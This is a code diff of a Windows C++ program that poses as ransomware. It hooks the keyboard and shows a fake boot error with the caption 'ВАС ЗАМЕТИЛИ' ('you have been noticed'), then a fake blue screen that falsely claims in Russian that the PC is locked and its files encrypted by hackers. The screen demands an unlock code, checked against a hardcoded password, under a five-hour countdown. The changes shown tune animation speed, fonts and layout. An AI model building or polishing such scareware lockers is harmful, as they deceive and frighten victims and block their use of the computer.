@@ -6,13 +6,13 @@ const std::wstring PASSWORD = L"29042011";
 std::wstring input_text = L"";
 bool is_bsod = false;
 DWORD start_time = 0;
-int time_left = 5 * 60 * 60; // 5 часов
+int time_left = 5 * 60 * 60;
 DWORD last_timer_tick = 0;
 bool show_error = false;
 DWORD error_time = 0;
 std::wstring pc_name = L"DESKTOP-12345";
 
-// Переменные для анимации печати
+// Текст для анимации
 std::wstring full_log_text = 
     L"Booting Windows ...\n"
     L"Boot error: 0x03527737\n"
@@ -44,7 +44,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
     switch (msg) {
     case WM_CREATE:
         hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
-        SetTimer(hwnd, 1, 30, NULL); // Таймер каждые 30 мс для анимации
+        // Ускоряем таймер (15 мс)
+        SetTimer(hwnd, 1, 15, NULL); 
         {
             wchar_t buf[256];
             DWORD size = 256;
@@ -56,25 +57,21 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         return 0;
 
     case WM_TIMER:
-        // Анимация печати
+        // Быстрая печать (по 2 символа за тик)
         if (!is_bsod && typed_chars < full_log_text.length()) {
-            typed_chars++;
+            typed_chars += 2; 
+            if (typed_chars > full_log_text.length()) typed_chars = full_log_text.length();
             InvalidateRect(hwnd, NULL, TRUE);
         }
-
-        // Переход на BSOD через 5 секунд
         if (!is_bsod && GetTickCount() - start_time > 5000) {
             is_bsod = true;
             InvalidateRect(hwnd, NULL, TRUE);
         }
-
-        // Тикаем таймер 5 часов
         if (is_bsod && GetTickCount() - last_timer_tick >= 1000) {
             if (time_left > 0) time_left--;
             last_timer_tick = GetTickCount();
             InvalidateRect(hwnd, NULL, TRUE);
         }
-        
         if (show_error && GetTickCount() - error_time > 3000) {
             show_error = false;
             InvalidateRect(hwnd, NULL, TRUE);
@@ -109,34 +106,34 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
         int cy = rect.bottom / 2;
         
         if (!is_bsod) {
-            // --- СЦЕНА 1: ВАС ЗАМЕТИЛИ (Анимация) ---
+            // --- СЦЕНА 1 ---
             FillRect(hdc, &rect, (HBRUSH)GetStockObject(BLACK_BRUSH));
             SetBkMode(hdc, TRANSPARENT);
             
-            HFONT fontSmall = CreateFontW(22, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
+            HFONT fontSmall = CreateFontW(20, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, fontSmall);
             
             SetTextColor(hdc, RGB(255, 0, 0));
             std::wstring current_text = full_log_text.substr(0, typed_chars);
-            // Мигающий курсор
-            if (typed_chars < full_log_text.length() || (GetTickCount() / 500) % 2 == 0) {
+            if (typed_chars < full_log_text.length() || (GetTickCount() / 300) % 2 == 0) {
                 current_text += L"_";
             }
             
-            RECT errRect = {50, cy - 250, cx + 400, cy - 50};
+            // ЖЕСТКО В ЛЕВОМ ВЕРХНЕМ УГЛУ
+            RECT errRect = {10, 10, 800, 600};
             DrawTextW(hdc, current_text.c_str(), -1, &errRect, DT_LEFT | DT_WORDBREAK);
             
-            // Глаз (Пропорционально)
-            HFONT fontEye = CreateFontW(80, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI Symbol");
+            // Глаз (используем большой юникод-символ глаза, по центру)
+            HFONT fontEye = CreateFontW(120, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Segoe UI Symbol");
             SelectObject(hdc, fontEye);
             SetTextColor(hdc, RGB(255, 255, 255));
-            RECT eyeRect = {cx - 150, cy - 50, cx + 150, cy + 50};
-            DrawTextW(hdc, L"\u25C9", -1, &eyeRect, DT_CENTER | DT_VCENTER);
+            RECT eyeRect = {cx - 200, cy - 100, cx + 200, cy + 100};
+            DrawTextW(hdc, L"\U0001F441", -1, &eyeRect, DT_CENTER | DT_VCENTER);
             
-            // Текст "ВАС ЗАМЕТИЛИ" (Тоже большой, как ты просил)
-            HFONT fontLarge = CreateFontW(45, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
+            // Текст "ВАС ЗАМЕТИЛИ"
+            HFONT fontLarge = CreateFontW(40, 0, 0, 0, FW_BOLD, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, fontLarge);
-            RECT titleRect = {cx - 300, cy + 70, cx + 300, cy + 150};
+            RECT titleRect = {cx - 300, cy + 80, cx + 300, cy + 150};
             DrawTextW(hdc, L"\u0412\u0410\u0421 \u0417\u0410\u041c\u0415\u0422\u0418\u041b\u0418", -1, &titleRect, DT_CENTER | DT_VCENTER);
 
             DeleteObject(fontSmall);
@@ -149,12 +146,11 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             DeleteObject(blueBrush);
             
             SetBkMode(hdc, TRANSPARENT);
-            // Огромный шрифт для BSOD
             HFONT font = CreateFontW(24, 0, 0, 0, FW_NORMAL, 0, 0, 0, DEFAULT_CHARSET, 0, 0, 0, 0, L"Consolas");
             SelectObject(hdc, font);
 
-            // Верхняя плашка
-            RECT whiteRect = {cx - 400, cy - 320, cx + 400, cy - 270};
+            // Верхняя плашка (такая же ширина, как нижнее поле ввода - 1100)
+            RECT whiteRect = {cx - 550, cy - 320, cx + 550, cy - 270};
             HBRUSH whiteBrush = CreateSolidBrush(RGB(255, 255, 255));
             FillRect(hdc, &whiteRect, whiteBrush);
             DeleteObject(whiteBrush);
@@ -163,7 +159,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             
             // Основной текст
             SetTextColor(hdc, RGB(255, 255, 255));
-            RECT textRect = {cx - 550, cy - 250, cx + 550, cy + 50};
+            RECT textRect = {cx - 550, cy - 200, cx + 550, cy + 50};
             const wchar_t* bsod_text = 
                 L"\u0423\u043f\u0441! \u0412\u044b \u043f\u043e\u0434\u0432\u0435\u0440\u0433\u043b\u0438\u0441\u044c \u043c\u0430\u0441\u0448\u0442\u0430\u0431\u043d\u043e\u0439 \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439 \u0430\u0442\u0430\u043a\u0435 \u0438 \u0442\u0435\u043f\u0435\u0440\u044c \u0412\u0430\u0448 \u043a\u043e\u043c\u043f\u044c\u044e\u0442\u0435\u0440\n"
                 L"\u0437\u0430\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u0430\u043d, \u0430 \u0432\u0441\u0435 \u0438\u043c\u0435\u044e\u0449\u0438\u0435\u0441\u044f \u0434\u0438\u0441\u043a\u0438 \u0438 \u0444\u0430\u0439\u043b\u044b \u043d\u0430 \u043d\u0438\u0445 \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u044b \u0445\u0430\u043a\u0435\u0440\u0441\u043a\u043e\u0439\n"
@@ -177,7 +173,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             
             DrawTextW(hdc, bsod_text, -1, &textRect, DT_LEFT | DT_WORDBREAK);
             
-            // Поле ввода
+            // Поле ввода (1100 в ширину)
             RECT inputRect = {cx - 550, cy + 100, cx + 550, cy + 150};
             HBRUSH inputBrush = CreateSolidBrush(RGB(255, 255, 255));
             FillRect(hdc, &inputRect, inputBrush);
@@ -187,13 +183,12 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp) {
             std::wstring display = L"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u0434 \u0440\u0430\u0437\u0431\u043b\u043e\u043a\u0438\u0440\u043e\u0432\u043a\u0438: " + input_text;
             DrawTextW(hdc, display.c_str(), -1, &inputRect, DT_LEFT | DT_VCENTER | DT_SINGLELINE);
 
-            // Имя ПК
+            // Имя ПК и Таймер
             SetTextColor(hdc, RGB(255, 255, 255));
             RECT bottomRect = {50, rect.bottom - 150, 800, rect.bottom - 110};
             std::wstring bottom = L"Current PC: " + pc_name;
             DrawTextW(hdc, bottom.c_str(), -1, &bottomRect, DT_LEFT);
             
-            // ОГРОМНЫЙ ТАЙМЕР ВНИЗУ СЛЕВА
             int hrs = time_left / 3600;
             int mins = (time_left % 3600) / 60;
             int secs = time_left % 60;
